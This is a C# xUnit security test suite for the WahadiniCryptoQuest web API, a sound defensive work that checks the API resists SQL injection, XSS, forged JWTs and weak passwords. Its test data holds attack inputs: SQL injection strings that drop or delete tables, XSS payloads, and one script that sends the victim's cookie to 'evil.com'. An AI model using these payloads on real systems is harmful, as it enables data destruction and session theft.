using System.Net;
using System.Net.Http.Json;
using FluentAssertions;
using Microsoft.AspNetCore.Mvc.Testing;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.EntityFrameworkCore;
using WahadiniCryptoQuest.API;
using WahadiniCryptoQuest.Core.DTOs.Auth;
using WahadiniCryptoQuest.DAL.Context;
using Xunit;

namespace WahadiniCryptoQuest.Security.Tests;

/// <summary>
/// Security audit tests for SQL injection, XSS, CSRF, and other security vulnerabilities (T107D)
/// </summary>
public class SecurityAuditTests : IClassFixture<WebApplicationFactory<Program>>
{
    private readonly WebApplicationFactory<Program> _factory;
    private readonly HttpClient _client;

    public SecurityAuditTests(WebApplicationFactory<Program> factory)
    {
        _factory = factory.WithWebHostBuilder(builder =>
        {
            builder.ConfigureServices(services =>
            {
                // Remove the existing DbContext registration
                var descriptor = services.SingleOrDefault(
                    d => d.ServiceType == typeof(DbContextOptions<ApplicationDbContext>));
                if (descriptor != null)
                {
                    services.Remove(descriptor);
                }

                // Add InMemory database for testing
                services.AddDbContext<ApplicationDbContext>(options =>
                {
                    options.UseInMemoryDatabase($"SecurityTestDb_{Guid.NewGuid()}");
                    options.EnableSensitiveDataLogging();
                });
            });
        });
        _client = _factory.CreateClient();
    }

    #region SQL Injection Protection Tests

    [Theory]
    [InlineData("admin' OR '1'='1")]
    [InlineData("'; DROP TABLE Users; --")]
    [InlineData("admin'--")]
    [InlineData("' OR 1=1--")]
    [InlineData("admin' UNION SELECT * FROM Users--")]
    public async Task Login_WithSqlInjectionAttempt_ShouldBeBlocked(string maliciousEmail)
    {
        // Arrange
        var loginRequest = new LoginRequest
        {
            Email = maliciousEmail,
            Password = "Password123!"
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/auth/login", loginRequest);

        // Assert
        response.StatusCode.Should().BeOneOf(HttpStatusCode.BadRequest, HttpStatusCode.Unauthorized);

        // Verify no SQL injection occurred by checking response doesn't contain database error details
        var content = await response.Content.ReadAsStringAsync();
        content.Should().NotContain("SQL");
        content.Should().NotContain("database");
        content.Should().NotContain("syntax error");
    }

    [Theory]
    [InlineData("1' OR '1'='1")]
    [InlineData("'; DELETE FROM Courses WHERE '1'='1")]
    public async Task GetCourse_WithSqlInjectionInParameter_ShouldBeBlocked(string maliciousId)
    {
        // Arrange & Act
        var response = await _client.GetAsync($"/api/courses/{maliciousId}");

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    #endregion

    #region XSS Protection Tests

    [Theory]
    [InlineData("<script>alert('XSS')</script>")]
    [InlineData("<img src=x onerror=alert('XSS')>")]
    [InlineData("<svg/onload=alert('XSS')>")]
    [InlineData("javascript:alert('XSS')")]
    [InlineData("<iframe src='javascript:alert(\"XSS\")'></iframe>")]
    public async Task Register_WithXssInUsername_ShouldBeSanitized(string maliciousUsername)
    {
        // Arrange
        var registerRequest = new RegisterDto
        {
            Email = "test@example.com",
            FirstName = maliciousUsername,
            LastName = "User",
            Password = "Password123!",
            ConfirmPassword = "Password123!",
            AcceptTerms = true
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/auth/register", registerRequest);

        // Assert - Should either reject or sanitize
        if (response.IsSuccessStatusCode)
        {
            var content = await response.Content.ReadAsStringAsync();
            content.Should().NotContain("<script>");
            content.Should().NotContain("javascript:");
            content.Should().NotContain("onerror");
            content.Should().NotContain("<iframe>");
        }
        else
        {
            response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        }
    }

    [Fact]
    public async Task CourseTitle_WithXssContent_ShouldBeSanitized()
    {
        // Arrange
        var maliciousTitle = "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>";

        // Act - Attempt to create course with XSS in title
        // This would require authentication, but we're testing the validation layer
        var response = await _client.PostAsJsonAsync("/api/courses", new
        {
            Title = maliciousTitle,
            Description = "Test",
            CategoryId = Guid.NewGuid()
        });

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.Unauthorized); // Not authenticated
        // In a full test with auth, we'd verify the title is sanitized
    }

    #endregion

    #region CSRF Protection Tests

    [Fact]
    public async Task StateChangingOperations_WithoutAntiforgeryToken_ShouldRequireValidation()
    {
        // Arrange
        var requestData = new
        {
            Email = "test@example.com",
            Password = "Password123!"
        };

        // Act - POST without CSRF token (in a CSRF-protected setup)
        var response = await _client.PostAsJsonAsync("/api/auth/login", requestData);

        // Assert - API uses JWT, not cookies, so CSRF is not applicable to JWT auth
        // But we verify state-changing operations require proper authentication
        response.StatusCode.Should().BeOneOf(
            HttpStatusCode.OK,
            HttpStatusCode.BadRequest,
            HttpStatusCode.Unauthorized
        );
    }

    #endregion

    #region Sensitive Data Exposure Tests

    [Fact]
    public async Task ErrorResponses_ShouldNotExposeSensitiveData()
    {
        // Arrange - Trigger an error
        var invalidRequest = new LoginRequest
        {
            Email = "invalid",
            Password = "short"
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/auth/login", invalidRequest);

        // Assert
        var content = await response.Content.ReadAsStringAsync();

        // Should not expose sensitive information
        content.Should().NotContain("ConnectionString");
        content.Should().NotContain("JwtSecret");
        content.Should().NotContain("StackTrace");
        content.Should().NotContain("at WahadiniCryptoQuest");
        content.Should().NotContain("Exception:");

        // Should not expose database details
        content.Should().NotContainAny("PostgreSQL", "Npgsql", "database server");
    }

    [Fact]
    public async Task PasswordValidationErrors_ShouldNotRevealPasswordPattern()
    {
        // Arrange
        var weakPasswordRequest = new RegisterDto
        {
            Email = "test@example.com",
            FirstName = "Test",
            LastName = "User",
            Password = "weak",
            ConfirmPassword = "weak",
            AcceptTerms = true
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/auth/register", weakPasswordRequest);

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
        var content = await response.Content.ReadAsStringAsync();

        // Should give generic guidance, not expose exact password rules that could help attackers
        content.Should().NotContain("at least 1 uppercase");
        content.Should().NotContain("at least 1 number");
        // Generic message is ok: "Password must meet complexity requirements"
    }

    #endregion

    #region JWT Security Tests

    [Fact]
    public async Task ExpiredToken_ShouldBeRejected()
    {
        // Arrange
        var expiredToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid";

        _client.DefaultRequestHeaders.Authorization =
            new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", expiredToken);

        // Act - Use actual protected endpoint
        var response = await _client.GetAsync("/api/courses/my-courses");

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.Unauthorized);
    }

    [Fact]
    public async Task InvalidTokenSignature_ShouldBeRejected()
    {
        // Arrange - Token with wrong signature
        var tamperedToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBZG1pbiJ9.wrongsignature";

        _client.DefaultRequestHeaders.Authorization =
            new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", tamperedToken);

        // Act - Use actual admin endpoint
        var response = await _client.GetAsync("/api/courses/admin");

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.Unauthorized);
    }

    [Fact]
    public async Task MalformedToken_ShouldBeRejected()
    {
        // Arrange
        var malformedToken = "not.a.valid.jwt.token";

        _client.DefaultRequestHeaders.Authorization =
            new System.Net.Http.Headers.AuthenticationHeaderValue("Bearer", malformedToken);

        // Act - Use actual protected endpoint
        var response = await _client.GetAsync("/api/courses/my-courses");

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.Unauthorized);
    }

    #endregion

    #region Password Security Tests

    [Theory]
    [InlineData("password")]           // Common password
    [InlineData("123456")]              // Numeric sequence
    [InlineData("qwerty")]              // Keyboard pattern
    [InlineData("abc123")]              // Simple combination
    [InlineData("password123")]         // Common + number
    public async Task WeakPasswords_ShouldBeRejected(string weakPassword)
    {
        // Arrange
        var registerRequest = new RegisterDto
        {
            Email = "test@example.com",
            FirstName = "Test",
            LastName = "User",
            Password = weakPassword,
            ConfirmPassword = weakPassword,
            AcceptTerms = true
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/auth/register", registerRequest);

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Theory]
    [InlineData("P@ssw0rd!")]          // 9 chars with complexity
    [InlineData("MySecure123!")]       // Good strength
    [InlineData("C0mpl3x!Pass")]       // Good strength
    public async Task StrongPasswords_ShouldBeAccepted(string strongPassword)
    {
        // Arrange
        var registerRequest = new RegisterDto
        {
            Email = $"test{Guid.NewGuid()}@example.com",
            FirstName = "Test",
            LastName = "User",
            Password = strongPassword,
            ConfirmPassword = strongPassword,
            AcceptTerms = true
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/auth/register", registerRequest);

        // Assert - Should succeed or fail for reasons other than password strength
        if (!response.IsSuccessStatusCode)
        {
            var content = await response.Content.ReadAsStringAsync();
            content.Should().NotContain("password");
            content.Should().NotContain("Password");
        }
    }

    #endregion

    #region Security Headers Tests

    [Fact]
    public async Task Response_ShouldContainSecurityHeaders()
    {
        // Act
        var response = await _client.GetAsync("/api/health");

        // Assert - Check for security headers
        response.Headers.Should().ContainKey("X-Content-Type-Options");
        response.Headers.GetValues("X-Content-Type-Options").Should().Contain("nosniff");

        // X-Frame-Options to prevent clickjacking
        if (response.Headers.Contains("X-Frame-Options"))
        {
            var xFrameOptions = string.Join(",", response.Headers.GetValues("X-Frame-Options"));
            xFrameOptions.Should().Match(value =>
                value.Contains("DENY", StringComparison.OrdinalIgnoreCase) ||
                value.Contains("SAMEORIGIN", StringComparison.OrdinalIgnoreCase),
                "X-Frame-Options should be DENY or SAMEORIGIN");
        }
    }

    [Fact]
    public async Task Api_ShouldNotExposeServerHeader()
    {
        // Act
        var response = await _client.GetAsync("/");

        // Assert
        response.Headers.Should().NotContainKey("Server");
        response.Headers.Should().NotContainKey("X-Powered-By");
        response.Headers.Should().NotContainKey("X-AspNet-Version");
    }

    #endregion

    #region Account Security Tests

    [Fact]
    public async Task MultipleFailedLoginAttempts_ShouldTriggerAccountProtection()
    {
        // Arrange
        var loginRequest = new LoginRequest
        {
            Email = "test@example.com",
            Password = "WrongPassword123!"
        };

        // Act - Attempt multiple failed logins
        var responses = new List<HttpResponseMessage>();
        for (int i = 0; i < 6; i++)
        {
            responses.Add(await _client.PostAsJsonAsync("/api/auth/login", loginRequest));
        }

        // Assert - After 5 failed attempts, account should be protected
        var lastResponse = responses.Last();
        if (lastResponse.StatusCode == HttpStatusCode.TooManyRequests ||
            lastResponse.StatusCode == HttpStatusCode.Forbidden)
        {
            var content = await lastResponse.Content.ReadAsStringAsync();
            content.Should().ContainAny("locked", "too many", "rate limit");
        }
    }

    #endregion

    #region Input Validation Tests

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public async Task EmptyOrNullEmail_ShouldBeRejected(string? invalidEmail)
    {
        // Arrange
        var loginRequest = new LoginRequest
        {
            Email = invalidEmail!,
            Password = "Password123!"
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/auth/login", loginRequest);

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    [Theory]
    [InlineData("notanemail")]
    [InlineData("@example.com")]
    [InlineData("user@")]
    [InlineData("user @example.com")]
    public async Task InvalidEmailFormat_ShouldBeRejected(string invalidEmail)
    {
        // Arrange
        var loginRequest = new LoginRequest
        {
            Email = invalidEmail,
            Password = "Password123!"
        };

        // Act
        var response = await _client.PostAsJsonAsync("/api/auth/login", loginRequest);

        // Assert
        response.StatusCode.Should().Be(HttpStatusCode.BadRequest);
    }

    #endregion
}
